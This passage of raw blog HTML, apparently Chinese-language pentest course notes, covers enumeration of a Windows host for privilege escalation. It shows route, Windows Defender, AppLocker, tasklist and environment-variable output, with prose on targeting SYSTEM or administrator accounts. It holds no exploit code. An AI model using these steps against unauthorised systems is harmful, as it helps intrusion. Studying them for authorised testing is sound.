class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  224.0.0.22            01-00-5<span class="title">e</span>-00-00-16     <span class="title">static</span></span></span><br><span class="line"><span class="function">  224.0.0.252           01-00-5<span class="title">e</span>-00-00-<span class="title">fc</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  239.255.255.250       01-00-5<span class="title">e</span>-7<span class="title">f</span>-<span class="title">ff</span>-<span class="title">fa</span>     <span class="title">static</span></span></span><br><span class="line"><span class="function">  255.255.255.255       <span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>-<span class="title">ff</span>     <span class="title">static</span></span></span><br></pre></td></tr></table></figure><h3 id="route"><a href="#route" class="headerlink" title="route"></a>route</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">route</span> <span class="title">print</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">===========================================================================</span></span><br><span class="line"><span class="function"><span class="title">Interface</span> <span class="title">List</span></span></span><br><span class="line"><span class="function">  9...00 50 56 <span class="title">b9</span> <span class="title">c5</span> 4<span class="title">b</span> ......<span class="title">vmxnet3</span> <span class="title">Ethernet</span> <span class="title">Adapter</span></span></span><br><span class="line"><span class="function">  4...00 50 56 <span class="title">b9</span> 90 94 ......<span class="title">Intel</span>(<span class="title">R</span>) 82574<span class="title">L</span> <span class="title">Gigabit</span> <span class="title">Network</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="function">  1...........................<span class="title">Software</span> <span class="title">Loopback</span> <span class="title">Interface</span> 1</span></span><br><span class="line"><span class="function">  3...00 00 00 00 00 00 00 <span class="title">e0</span> <span class="title">Microsoft</span> <span class="title">ISATAP</span> <span class="title">Adapter</span></span></span><br><span class="line"><span class="function">  5...00 00 00 00 00 00 00 <span class="title">e0</span> <span class="title">Teredo</span> <span class="title">Tunneling</span> <span class="title">Pseudo</span>-<span class="title">Interface</span></span></span><br><span class="line"><span class="function"> 13...00 00 00 00 00 00 00 <span class="title">e0</span> <span class="title">Microsoft</span> <span class="title">ISATAP</span> <span class="title">Adapter</span> #2</span></span><br><span class="line"><span class="function">===========================================================================</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">IPv4</span> <span class="title">Route</span> <span class="title">Table</span></span></span><br><span class="line"><span class="function">===========================================================================</span></span><br><span class="line"><span class="function"><span class="title">Active</span> <span class="title">Routes</span>:</span></span><br><span class="line"><span class="function"><span class="title">Network</span> <span class="title">Destination</span>        <span class="title">Netmask</span>          <span class="title">Gateway</span>       <span class="title">Interface</span>  <span class="title">Metric</span></span></span><br><span class="line"><span class="function">          0.0.0.0          0.0.0.0       10.129.0.1      10.129.43.8     25</span></span><br><span class="line"><span class="function">          0.0.0.0          0.0.0.0     192.168.20.1    192.168.20.56    271</span></span><br><span class="line"><span class="function">       10.129.0.0      255.255.0.0         <span class="title">On</span>-<span class="title">link</span>       10.129.43.8    281</span></span><br><span class="line"><span class="function">      10.129.43.8  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>       10.129.43.8    281</span></span><br><span class="line"><span class="function">   10.129.255.255  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>       10.129.43.8    281</span></span><br><span class="line"><span class="function">        127.0.0.0        255.0.0.0         <span class="title">On</span>-<span class="title">link</span>         127.0.0.1    331</span></span><br><span class="line"><span class="function">        127.0.0.1  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>         127.0.0.1    331</span></span><br><span class="line"><span class="function">  127.255.255.255  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>         127.0.0.1    331</span></span><br><span class="line"><span class="function">     192.168.20.0    255.255.255.0         <span class="title">On</span>-<span class="title">link</span>     192.168.20.56    271</span></span><br><span class="line"><span class="function">    192.168.20.56  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>     192.168.20.56    271</span></span><br><span class="line"><span class="function">   192.168.20.255  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>     192.168.20.56    271</span></span><br><span class="line"><span class="function">        224.0.0.0        240.0.0.0         <span class="title">On</span>-<span class="title">link</span>         127.0.0.1    331</span></span><br><span class="line"><span class="function">        224.0.0.0        240.0.0.0         <span class="title">On</span>-<span class="title">link</span>       10.129.43.8    281</span></span><br><span class="line"><span class="function">        224.0.0.0        240.0.0.0         <span class="title">On</span>-<span class="title">link</span>     192.168.20.56    271</span></span><br><span class="line"><span class="function">  255.255.255.255  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>         127.0.0.1    331</span></span><br><span class="line"><span class="function">  255.255.255.255  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>       10.129.43.8    281</span></span><br><span class="line"><span class="function">  255.255.255.255  255.255.255.255         <span class="title">On</span>-<span class="title">link</span>     192.168.20.56    271</span></span><br><span class="line"><span class="function">===========================================================================</span></span><br><span class="line"><span class="function"><span class="title">Persistent</span> <span class="title">Routes</span>:</span></span><br><span class="line"><span class="function">  <span class="title">Network</span> <span class="title">Address</span>          <span class="title">Netmask</span>  <span class="title">Gateway</span> <span class="title">Address</span>  <span class="title">Metric</span></span></span><br><span class="line"><span class="function">          0.0.0.0          0.0.0.0     192.168.20.1  <span class="title">Default</span></span></span><br><span class="line"><span class="function">===========================================================================</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">...<span class="title">SNPI</span>...</span></span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -r</span><br></pre></td></tr></table></figure><hr><h1 id="Enumerating-Protections"><a href="#Enumerating-Protections" class="headerlink" title="Enumerating Protections"></a>Enumerating Protections</h1><h2 id="Windows-Defender"><a href="#Windows-Defender" class="headerlink" title="Windows Defender"></a>Windows Defender</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-MpComputerStatus</span></span><br><span class="line"></span><br><span class="line">AMEngineVersion                 : <span class="number">1.1</span>.<span class="number">17900.7</span></span><br><span class="line">AMProductVersion                : <span class="number">4.10</span>.<span class="number">14393.2248</span></span><br><span class="line">AMServiceEnabled                : True</span><br><span class="line">AMServiceVersion                : <span class="number">4.10</span>.<span class="number">14393.2248</span></span><br><span class="line">AntispywareEnabled              : True</span><br><span class="line">AntispywareSignatureAge         : <span class="number">1</span></span><br><span class="line">AntispywareSignatureLastUpdated : <span class="number">3</span>/<span class="number">28</span>/<span class="number">2021</span> <span class="number">2</span>:<span class="number">59</span>:<span class="number">13</span> AM</span><br><span class="line">AntispywareSignatureVersion     : <span class="number">1.333</span>.<span class="number">1470.0</span></span><br><span class="line">AntivirusEnabled                : True</span><br><span class="line">AntivirusSignatureAge           : <span class="number">1</span></span><br><span class="line">AntivirusSignatureLastUpdated   : <span class="number">3</span>/<span class="number">28</span>/<span class="number">2021</span> <span class="number">2</span>:<span class="number">59</span>:<span class="number">12</span> AM</span><br><span class="line">AntivirusSignatureVersion       : <span class="number">1.333</span>.<span class="number">1470.0</span></span><br><span class="line">BehaviorMonitorEnabled          : False</span><br><span class="line">ComputerID                      : <span class="number">54</span>AF7DE4<span class="literal">-3C7E-4DA0-87AC-831B045B9063</span></span><br><span class="line">ComputerState                   : <span class="number">0</span></span><br><span class="line">FullScanAge                     : <span class="number">4294967295</span></span><br><span class="line">FullScanEndTime                 :</span><br><span class="line">FullScanStartTime               :</span><br><span class="line">IoavProtectionEnabled           : False</span><br><span class="line">LastFullScanSource              : <span class="number">0</span></span><br><span class="line">LastQuickScanSource             : <span class="number">0</span></span><br><span class="line">NISEnabled                      : False</span><br><span class="line">NISEngineVersion                : <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line">NISSignatureAge                 : <span class="number">4294967295</span></span><br><span class="line">NISSignatureLastUpdated         :</span><br><span class="line">NISSignatureVersion             : <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line">OnAccessProtectionEnabled       : False</span><br><span class="line">QuickScanAge                    : <span class="number">4294967295</span></span><br><span class="line">QuickScanEndTime                :</span><br><span class="line">QuickScanStartTime              :</span><br><span class="line">RealTimeProtectionEnabled       : False</span><br><span class="line">RealTimeScanDirection           : <span class="number">0</span></span><br><span class="line">PSComputerName                  :</span><br></pre></td></tr></table></figure><h2 id="AppLocker"><a href="#AppLocker" class="headerlink" title="AppLocker"></a>AppLocker</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Effective</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> RuleCollections</span><br><span class="line"></span><br><span class="line">PublisherConditions : &#123;*\*\*,<span class="number">0.0</span>.<span class="number">0.0</span>-*&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : a9e18c21<span class="literal">-ff8f-43cf-b9fc-db40eed693ba</span></span><br><span class="line">Name                : (Default Rule) All signed packaged apps</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run packaged apps that are signed.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%PROGRAMFILES%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">921</span>cc481<span class="literal">-6e17-4653-8f75-050b80acca20</span></span><br><span class="line">Name                : (Default Rule) All files located <span class="keyword">in</span> the Program Files folder</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run applications that are located <span class="keyword">in</span> the Program Files</span><br><span class="line">                      folder.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%WINDIR%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : a61c8b2c<span class="literal">-a319-4cd0-9690-d2177cad7b51</span></span><br><span class="line">Name                : (Default Rule) All files located <span class="keyword">in</span> the Windows folder</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run applications that are located <span class="keyword">in</span> the Windows folder.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : fd686d83<span class="literal">-a829-4351-8ff4-27c7de5755d2</span></span><br><span class="line">Name                : (Default Rule) All files</span><br><span class="line">Description         : Allows members of the local Administrators <span class="built_in">group</span> to run all applications.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-5-32-544</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PublisherConditions : &#123;*\*\*,<span class="number">0.0</span>.<span class="number">0.0</span>-*&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : b7af7102<span class="literal">-efde-4369-8a89-7a6a392d1473</span></span><br><span class="line">Name                : (Default Rule) All digitally signed Windows Installer files</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run digitally signed Windows Installer files.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%WINDIR%\Installer\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">5</span>b290184<span class="literal">-345a-4453-b184-45305f6d9a54</span></span><br><span class="line">Name                : (Default Rule) All Windows Installer files <span class="keyword">in</span> %systemdrive%\Windows\Installer</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run all Windows Installer files located <span class="keyword">in</span></span><br><span class="line">                      %systemdrive%\Windows\Installer.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;*.*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">64</span>ad46ff<span class="literal">-0d71-4fa0-a30b-3f3d30c5433d</span></span><br><span class="line">Name                : (Default Rule) All Windows Installer files</span><br><span class="line">Description         : Allows members of the local Administrators <span class="built_in">group</span> to run all Windows Installer files.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-5-32-544</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%PROGRAMFILES%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">06</span>dce67b<span class="literal">-934c-454f-a263-2515c8796a5d</span></span><br><span class="line">Name                : (Default Rule) All scripts located <span class="keyword">in</span> the Program Files folder</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run scripts that are located <span class="keyword">in</span> the Program Files folder.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;%WINDIR%\*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : <span class="number">9428</span>c672<span class="literal">-5fc3-47f4-808a-a0011f36dd2c</span></span><br><span class="line">Name                : (Default Rule) All scripts located <span class="keyword">in</span> the Windows folder</span><br><span class="line">Description         : Allows members of the Everyone <span class="built_in">group</span> to run scripts that are located <span class="keyword">in</span> the Windows folder.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-1-0</span></span><br><span class="line">Action              : Allow</span><br><span class="line"></span><br><span class="line">PathConditions      : &#123;*&#125;</span><br><span class="line">PathExceptions      : &#123;&#125;</span><br><span class="line">PublisherExceptions : &#123;&#125;</span><br><span class="line">HashExceptions      : &#123;&#125;</span><br><span class="line">Id                  : ed97d0cb<span class="literal">-15ff-430f-b82c-8d7832957725</span></span><br><span class="line">Name                : (Default Rule) All scripts</span><br><span class="line">Description         : Allows members of the local Administrators <span class="built_in">group</span> to run all scripts.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-5-32-544</span></span><br><span class="line">Action              : Allow</span><br></pre></td></tr></table></figure><h2 id="Test-AppLockerPolicy"><a href="#Test-AppLockerPolicy" class="headerlink" title="Test-AppLockerPolicy"></a>Test-AppLockerPolicy</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Local</span> | <span class="built_in">Test-AppLockerPolicy</span> <span class="literal">-path</span> C:\Windows\System32\cmd.exe <span class="literal">-User</span> Everyone</span><br><span class="line"></span><br><span class="line">FilePath                    PolicyDecision MatchingRule</span><br><span class="line"><span class="literal">--------</span>                    <span class="literal">--------------</span> <span class="literal">------------</span></span><br><span class="line">C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure><hr><h1 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h1><p>在评估期间，可能会在 Windows 主机（无论是否加入域）上获得低权限 shell，并且需要执行权限提升才能进一步获得访问权限。完全攻陷主机可能会让获得敏感文件&#x2F;文件共享的访问权限，授予捕获流量以获取更多凭据的能力，或者获取可帮助进一步获得访问权限甚至直接提升到 Active Directory 环境中的域管理员的凭据。根据系统配置和遇到的数据类型将权限提升到以下之一：</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>高权限<code>NT AUTHORITY\SYSTEM</code>帐户或<a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account">LocalSystem</a>帐户，它是一种比本地管理员帐户具有更多权限的高权限帐户，用于运行大多数 Windows 服务。</td></tr><tr><td>内置本地<code>administrator</code>帐户。有些组织会禁用此帐户，但很多组织不会禁用。在客户端环境中，跨多个系统重复使用此帐户的情况并不罕见。</td></tr><tr><td>另一个属于本地<code>Administrators</code>组成员的本地帐户。此组中的任何帐户都将具有与内置<code>administrator</code>帐户相同的权限。</td></tr><tr><td>属于本地<code>Administrators</code>组的标准（非特权）域用户。</td></tr><tr><td>属于本地<code>Administrators</code>组的域管理员（在 Active Directory 环境中拥有高度特权）。</td></tr></tbody></table><p><strong>关键数据</strong></p><p><code>OS name</code>：了解 Windows 操作系统的类型（工作站或服务器）和级别（Windows 7 或 10、Server 2008、2012、2016、2019 等）将使了解可能可用的工具类型（例如<code>PowerShell</code>旧版系统上的版本或缺少的版本）。这还可以识别可能存在公开漏洞的操作系统版本。。</p><p><code>Version</code>：与操作系统<a href="https://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions">版本</a>一样，可能存在针对特定 Windows 版本漏洞的公开漏洞。Windows 系统漏洞可能会导致系统不稳定甚至完全崩溃。在任何生产系统上运行这些漏洞时都要小心谨慎，并确保在运行漏洞之前完全了解漏洞及其可能造成的后果。</p><p><code>Running Services</code>：了解主机上运行的服务非常重要，尤其是以<code>NT AUTHORITY\SYSTEM</code>管理员级别帐户运行的服务。在特权帐户上下文中运行的配置错误或存在漏洞的服务很容易被特权提升。</p><h2 id="System-Information"><a href="#System-Information" class="headerlink" title="System Information"></a>System Information</h2><p>查看系统本身可以让更好地了解确切的操作系统版本、正在使用的硬件、已安装的程序和安全更新。这将帮助缩小寻找任何可能利用来提升权限的缺失补丁和相关 CVE 的范围。</p><p> <code>tasklist</code> 查看正在运行的可执行文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">tasklist</span> /<span class="title">svc</span></span></span><br><span class="line"><span class="function"># <span class="title">tasklist</span> /<span class="title">svc</span> /<span class="title">fi</span> &quot;<span class="title">PID</span> <span class="title">eq</span> 1234&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Image</span> <span class="title">Name</span>                     <span class="title">PID</span> <span class="title">Services</span></span></span><br><span class="line"><span class="function">========================= ======== ============================================</span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Idle</span> <span class="title">Process</span>              0 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">System</span>                           4 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">smss.exe</span>                       316 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">csrss.exe</span>                      424 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">wininit.exe</span>                    528 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">csrss.exe</span>                      540 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">winlogon.exe</span>                   612 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">services.exe</span>                   664 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">lsass.exe</span>                      672 <span class="title">KeyIso</span>, <span class="title">SamSs</span>, <span class="title">VaultSvc</span></span></span><br><span class="line"><span class="function"><span class="title">svchost.exe</span>                    776 <span class="title">BrokerInfrastructure</span>, <span class="title">DcomLaunch</span>, <span class="title">LSM</span>,</span></span><br><span class="line"><span class="function">                                   <span class="title">PlugPlay</span>, <span class="title">Power</span>, <span class="title">SystemEventsBroker</span></span></span><br><span class="line"><span class="function"><span class="title">svchost.exe</span>                    836 <span class="title">RpcEptMapper</span>, <span class="title">RpcSs</span></span></span><br><span class="line"><span class="function"><span class="title">LogonUI.exe</span>                    952 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">dwm.exe</span>                        964 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">svchost.exe</span>                    972 <span class="title">TermService</span></span></span><br><span class="line"><span class="function"><span class="title">svchost.exe</span>                   1008 <span class="title">Dhcp</span>, <span class="title">EventLog</span>, <span class="title">lmhosts</span>, <span class="title">TimeBrokerSvc</span></span></span><br><span class="line"><span class="function"><span class="title">svchost.exe</span>                    364 <span class="title">NcbService</span>, <span class="title">PcaSvc</span>, <span class="title">ScDeviceEnum</span>, <span class="title">TrkWks</span>,</span></span><br><span class="line"><span class="function">                                   <span class="title">UALSVC</span>, <span class="title">UmRdpService</span></span></span><br><span class="line"><span class="function">&lt;...<span class="title">SNIP</span>...&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">FileZilla</span> <span class="title">Server</span> <span class="title">Interfac</span>     5628 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">jusched.exe</span>                   5796 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">cmd.exe</span>                       4132 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">conhost.exe</span>                   4136 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">TrustedInstaller.exe</span>          1120 <span class="title">TrustedInstaller</span></span></span><br><span class="line"><span class="function"><span class="title">TiWorker.exe</span>                  1816 <span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">WmiApSrv.exe</span>                  2428 <span class="title">wmiApSrv</span></span></span><br><span class="line"><span class="function"><span class="title">tasklist.exe</span>                  3596 <span class="title">N</span>/<span class="title">A</span></span></span><br></pre></td></tr></table></figure><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>环境变量可以解释很多有关主机配置的信息。</p><p><code>set</code> 打印出环境变量</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">set</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ALLUSERSPROFILE</span>=<span class="title">C</span>:\<span class="title">ProgramData</span></span></span><br><span class="line"><span class="function"><span class="title">APPDATA</span>=<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Administrator</span>\<span class="title">AppData</span>\<span class="title">Roaming</span></span></span><br><span class="line"><span class="function"><span class="title">CommonProgramFiles</span>=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Common</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function"><span class="title">CommonProgramFiles</span>(<span class="title">x86</span>)=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Common</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function"><span class="title">CommonProgramW6432</span>=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Common</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function"><span class="title">COMPUTERNAME</span>=<span 